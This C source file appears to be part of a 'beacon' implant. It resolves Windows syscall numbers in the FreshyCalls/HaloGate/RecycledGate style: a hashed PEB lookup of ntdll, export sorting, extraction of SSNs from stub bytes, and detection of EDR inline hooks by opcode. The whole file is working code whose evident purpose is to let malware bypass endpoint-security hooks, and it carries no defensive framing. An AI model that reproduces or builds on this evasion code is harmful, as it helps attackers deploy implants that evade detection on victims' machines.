#include "beacon_syscall_internal.h"

/*
 * gate_common.c -- SSN 解析共享工具。
 *
 * 移植自 D:\code\Vs2022\syscall 验证工程（FreshyCalls / HaloGate / RecycledGate），
 * 三处修正：
 *  1. 导出过滤必须用 IsLikelyNtSyscallName（排除 Ntdll*、第 3 字符大写）——
 *     规避 RecycledGate.cpp 未过滤导致的排序偏移 bug；
 *  2. ntdll 基址复用 GetModuleByPeb，不重写 PEB 遍历；
 *  3. 导出缓存进程内只构建一次（eager 解析会多次调用 ResolveNumber）。
 */

static GateExport g_gate_exports[GATE_MAX_EXPORTS];
static UINT32 g_gate_export_count;
static BOOL g_gate_cache_ready;

UINT32 GateHashName(const CHAR* s)
{
    UINT32 h = 0x1505u;

    while (*s) {
        h = ((h << 5) + h) ^ (unsigned char)*s++;
    }
    return h;
}

/* Nt 导出过滤：必须是 Nt 开头；排除 Ntdll*（NtdllDefWindowProc_A/W 等伪 Nt 导出）；
 * Nt 后必须跟大写字母（真正的 syscall 名如 NtAllocate...）。 */
static BOOL IsLikelyNtSyscallName(const CHAR* name)
{
    if (!name) return FALSE;
    if (name[0] != 'N' || name[1] != 't') return FALSE;
    if (name[2] == 'd' && name[3] == 'l' && name[4] == 'l') return FALSE;
    if (name[2] < 'A' || name[2] > 'Z') return FALSE;
    return TRUE;
}

/* 插入排序：按函数地址升序（避免 qsort 依赖） */
static VOID SortExports(GateExport* arr, UINT32 n)
{
    UINT32 i;

    for (i = 1; i < n; i++) {
        GateExport key = arr[i];
        LONG j = (LONG)i - 1;

        while (j >= 0 && (ULONG_PTR)arr[j].Address > (ULONG_PTR)key.Address) {
            arr[j + 1] = arr[j];
            j--;
        }
        arr[j + 1] = key;
    }
}

BOOL GateInitCache(VOID)
{
    HMODULE hNtdll;
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_EXPORT_DIRECTORY pExp;
    PDWORD pFnArr;
    PDWORD pNmArr;
    PWORD pOrArr;
    UINT32 i;

    if (g_gate_cache_ready) return TRUE;

    hNtdll = GetModuleByPeb(H_MOD_NTDLL_DLL_HASH);
    if (!hNtdll) return FALSE;

    pDos = (PIMAGE_DOS_HEADER)hNtdll;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
    if (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) {
        return FALSE;
    }
    pExp = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)hNtdll +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    pFnArr = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfFunctions);
    pNmArr = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfNames);
    pOrArr = (PWORD)((PBYTE)hNtdll + pExp->AddressOfNameOrdinals);

    g_gate_export_count = 0;
    for (i = 0; i < pExp->NumberOfNames && g_gate_export_count < GATE_MAX_EXPORTS; i++) {
        const CHAR* name = (const CHAR*)((PBYTE)hNtdll + pNmArr[i]);

        if (IsLikelyNtSyscallName(name)) {
            g_gate_exports[g_gate_export_count].Address =
                (PVOID)((PBYTE)hNtdll + pFnArr[pOrArr[i]]);
            g_gate_exports[g_gate_export_count].Hash = GateHashName(name);
            g_gate_export_count++;
        }
    }

    SortExports(g_gate_exports, g_gate_export_count);
    g_gate_cache_ready = TRUE;
    return g_gate_export_count > 0;
}

const GateExport* GateGetExports(UINT32* count)
{
    if (count) *count = g_gate_export_count;
    return g_gate_cache_ready ? g_gate_exports : NULL;
}

LONG GateFindByHash(UINT32 hash)
{
    UINT32 i;

    if (!g_gate_cache_ready) return -1;
    for (i = 0; i < g_gate_export_count; i++) {
        if (g_gate_exports[i].Hash == hash) return (LONG)i;
    }
    return -1;
}

BOOL GateExtractSsn(PBYTE pFn, UINT32* ssn_out)
{
    UINT32 k;

    if (!pFn || !ssn_out) return FALSE;

    for (k = 0; k < 32; k++) {
        if (pFn[k]     == 0x4Cu && pFn[k + 1] == 0x8Bu &&
            pFn[k + 2] == 0xD1u && pFn[k + 3] == 0xB8u) {
            *ssn_out = (UINT32)pFn[k + 4] | ((UINT32)pFn[k + 5] << 8u);
            return TRUE;
        }
    }
    return FALSE;
}

BOOL GateIsHooked(PBYTE pFn)
{
    if (!pFn) return TRUE;

    return (pFn[0] == 0xE9u) ||                              /* near jmp rel32 */
           (pFn[0] == 0xFFu && pFn[1] == 0x25u) ||          /* jmp [rip+offset] */
           (pFn[0] == 0xE8u) ||                              /* call */
           (pFn[0] == 0xCCu) ||                              /* int3 */
           (pFn[0] == 0xEBu);                                /* short jmp */
}

#ifdef BEACON_TEST
VOID GateTestSetExports(const GateExport* exports, UINT32 count)
{
    UINT32 i;

    if (!exports || count == 0 || count > GATE_MAX_EXPORTS) return;
    for (i = 0; i < count; i++) {
        g_gate_exports[i] = exports[i];
    }
    g_gate_export_count = count;
    g_gate_cache_ready = TRUE;
}

VOID GateTestResetCache(VOID)
{
    g_gate_cache_ready = FALSE;
    g_gate_export_count = 0;
}
#endif
